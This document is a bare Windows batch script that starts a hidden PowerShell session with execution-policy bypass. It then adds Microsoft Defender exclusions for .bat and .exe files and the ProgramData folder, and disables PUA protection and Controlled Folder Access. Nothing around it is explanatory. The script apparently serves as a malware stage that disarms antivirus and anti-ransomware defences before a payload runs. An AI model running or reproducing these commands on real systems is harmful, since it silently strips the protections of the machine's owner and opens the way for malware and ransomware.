@echo off
start /B powershell.exe -nop -ep bypass -w Hidden
powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""

powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""

powershell.exe -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"$env:ProgramData'"

powershell.exe -command "Set-MpPreference -PUAProtection disable"

powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"